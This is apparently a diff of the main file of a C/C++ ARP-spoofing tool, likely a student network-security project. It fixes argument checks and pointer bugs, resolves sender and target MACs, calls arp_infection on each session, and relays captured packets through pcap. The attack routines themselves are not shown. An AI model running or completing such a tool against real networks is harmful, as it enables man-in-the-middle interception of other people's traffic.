@@ -1,4 +1,10 @@
-#include "send.h"
+#include "arp_spoof.h"
+
+uint8_t my_mac[6], my_ip[4];
+int session_cnt;
+map<uint32_t, uint8_t*> ip2mac;
+pcap_t *fp;
+vector<session> ip_vector;
 
 void usage() {
 	printf("syntax: arp_spoof <interface> <sender ip 1> <target ip 1> [<sender ip 2> <target ip 2>...]\n");
@@ -6,7 +12,7 @@ void usage() {
 }
 
 int main(int argc, char * argv[]) {
-	if (argc < 4 || argv % 2) {
+	if (argc < 4 || argc % 2) {
 		usage();
 		return -1;
 	}
@@ -27,16 +33,16 @@ int main(int argc, char * argv[]) {
 		tmp.sender_ip = inet_addr(argv[i * 2 + 2]);
 		if(ip2mac.find(tmp.sender_ip) == ip2mac.end()) {
 			ip2mac[tmp.sender_ip] = (uint8_t *)malloc(6);
-			get_mac(ip2mac[tmp.sender_ip], (uint8_t *)tmp.sender_ip);
+			get_mac(ip2mac[tmp.sender_ip], (uint8_t *)&tmp.sender_ip);
 		}
 		tmp.target_ip = inet_addr(argv[i * 2 + 3]);
 		if(ip2mac.find(tmp.target_ip) == ip2mac.end()) {
 			ip2mac[tmp.target_ip] = (uint8_t *)malloc(6);
-			get_mac(ip2mac[tmp.target_ip], (uint8_t *)tmp.target_ip);
+			get_mac(ip2mac[tmp.target_ip], (uint8_t *)&tmp.target_ip);
 		}
 	}
-	for(int i = 0; i < session.cnt; i++) {
-		arp_infection(session[i]);
+	for(int i = 0; i < session_cnt; i++) {
+		arp_infection(ip_vector[i]);
 	}
 	pcap_loop(fp, 0, pkt_relay_recover, NULL);
 	pcap_close(fp);
